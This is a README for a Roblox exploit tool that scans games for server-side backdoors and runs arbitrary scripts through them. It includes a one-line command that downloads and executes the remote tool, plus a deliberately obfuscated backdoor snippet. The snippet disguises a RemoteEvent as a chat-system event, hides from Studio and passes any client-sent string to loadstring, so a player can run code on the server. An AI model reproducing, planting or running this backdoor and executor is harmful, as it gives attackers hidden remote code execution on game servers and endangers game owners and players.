# backdoor-executor.lua
(pls help me get a new name for this script)
might be better than [backdoor.exe](https://github.com/iK4oS/backdoor.exe) in terms of scanning.

## Info
This script is for [Roblox](https://roblox.com) scanning backdoors and executing serversided scripts within a gui.
### Script
Just copy the script below and execute it through your executor.
```lua
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/backdoor-executor.lua"))()
```
### Requirements
- A brain that knows this stuff
- Decent executor that supports filesystem functions (for config)
### Config Help
- My config has reset back to original
> The config will reset to the original config if the config version(configVer in [bexe-config.lua](https://github.com/jLn0n/created-scripts-public/blob/main/backdoor-executor/bexe-config.lua)) is lower than the original config so you should always backup your config to prevent config resets
- Adding cache example
```lua
[placeid] = {
	["Path"] = "remote.path.here", -- this is the path of the remote, don't do remote.path["here"] or it will not work
	["Args"] = {"arg1here", "source"}, -- source shouldn't be deleted because its a arg for scripts that will be executed
	["Func"] = function(source) -- use this if a game has a custom encryption for source
		return source
	end
}
```
> if the cache didn't work backdoor-executor.lua will warn u that the cache is outdated
- Using autoexecute
> add a script inside the autoExecute table, you can put many code as long as you want inside the table, example:
```lua
-- it should be a array and don't add a nil or it will not work
{
	[[print("jLn0n is epic!")]],
	[[warn("backdoor-executor.lua needs a new name!")]]
},
```
- blacklisting events
> it should be just like adding scripts on autoexecute, example:
```lua
{
	["eventNames"] = {
		["blacklistedNameHere"] = true
	},
	["eventParentNames"] = {
		["blacklistedParentName"] = true
	}
},
```

## Adding a backdoor in your game
Get access to a game in Roblox Studio, create a script and paste the few lines of code below in the script.
Make sure to enable `LoadStringEnabled` property in `ServerScriptService`. (code is just semi-obfuscated and easily crackable lol)
```lua
if game:GetService("\82\117\110\83\101\114\118\105\99\101"):IsStudio() or not game:GetService("\83\101\114\118\101\114\83\99\114\105\112\116\83\101\114\118\105\99\101").LoadStringEnabled then return end
local a1 = Instance.new("\82\101\109\111\116\101\69\118\101\110\116"); a1.Name = "\71\101\116\80\108\97\121\101\114\77\101\115\115\97\103\101\65\115\121\110\99"; a1.Parent=game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101"):WaitForChild("\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115"); a1.OnServerEvent:Connect(function(_, a2)loadstring(a2)()end)
```
